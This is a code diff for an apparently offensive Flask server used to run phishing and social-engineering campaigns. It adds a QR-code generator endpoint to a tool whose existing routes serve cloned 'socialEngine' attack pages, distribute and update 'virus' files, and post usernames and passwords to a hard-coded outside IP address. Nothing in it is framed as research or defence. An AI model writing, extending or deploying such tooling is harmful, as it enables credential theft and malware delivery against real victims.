@@ -13,6 +13,7 @@ import mimetypes
 import threading
 import time
 from urllib.parse import unquote
+import qrcode
 
 
 import config_loader as config_loader
@@ -26,6 +27,7 @@ CORS(app)
 url_list = {}
 config: config_loader = None
 visit_request = {}
+ip_proxy = {}
 
 class user_sessen():
     username: str = ''
@@ -43,6 +45,33 @@ def get_random() -> str:
         return get_random()
     else:
         return random_string
+
+@app.route('/qr_code' , methods=['POST'])
+def make_qr_code():
+    # 限制每个IP对制定api的访问.
+    client_ip = request.remote_addr
+    if client_ip in visit_request:
+        visit_request[client_ip] = visit_request[client_ip] + 1
+        if visit_request[client_ip] >= 9:
+            return 'Too many requests'
+    else:
+        visit_request[client_ip] = 1
+        
+    data = request.get_data().decode('utf-8').strip()
+    img_file = r'qrcode/'+ get_random()+".png"
+    qr = qrcode.QRCode(
+        version=1,
+        error_correction=qrcode.constants.ERROR_CORRECT_H,
+        box_size=10,
+        border=4
+    )
+    qr.add_data(data)
+    qr.make(fit=True)
+    img = qr.make_image()
+    img.save(img_file)
+    img.show()
+    file_name = img_file
+    return send_file(file_name, as_attachment=True, attachment_filename=file_name)
 
 @app.route('/get_virus/<file_name>')
 def get_virus(file_name):
@@ -106,10 +135,12 @@ def update_virus(filename):
 
 @app.route('/<path:attack_url>')
 def attack_url(attack_url):
+
     if attack_url in url_list.keys():
         u: user_sessen = url_list.get(attack_url)
         r = Response()
         try:
+                
             # print('modules/socialEngine/'+u.attack_type+"/index.html")
             # print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
             r.data = open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read()
@@ -164,6 +195,8 @@ def WebClone(attack_url , user , pwd):
             return 'Too many requests'
     else:
         visit_request[client_ip] = 1
+
+    attack_url = str(attack_url).replace('-' , '/')
 
     r = requests.post('http://154.201.85.154:11111/login' , data=user+"\n"+pwd)
     if r.text != 'Passwd Or UserName Error!':
